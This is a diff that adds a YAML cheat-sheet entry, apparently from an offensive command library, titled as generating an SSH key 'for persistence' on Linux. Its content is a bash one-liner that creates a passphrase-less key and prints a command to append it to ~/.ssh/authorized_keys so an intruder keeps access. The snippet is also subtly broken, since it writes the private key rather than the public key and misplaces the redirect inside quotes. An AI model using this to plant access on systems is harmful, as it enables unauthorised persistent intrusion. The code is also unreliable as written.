@@ -1,0 +1,9 @@
+metadata:
+  filename: "generate-ssh-key-for-persistence.yaml"
+  tags: ["linux"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  bash -c 'ssh-keygen -q -t ed25519 -f id_ed25519 -N "" && echo "A key has been generate. To gain persistence, enter the following command:" && echo "mkdir -p ~/.ssh/; echo \"$(cat id_ed25519) >> ~/.ssh/authorized_keys\""'
+
